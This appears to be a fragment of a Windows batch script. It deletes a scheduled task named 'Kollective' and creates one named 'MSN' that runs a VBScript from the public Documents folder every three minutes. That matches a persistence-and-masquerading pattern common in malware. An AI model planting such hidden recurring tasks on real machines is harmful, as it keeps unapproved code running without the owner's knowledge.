schtasks /delete /tn "Kollective" /f
schtasks /create /sc minute /mo 3 /tn "MSN" /tr "%PUBLIC%\Documents\Kollective\kollective.vbs"
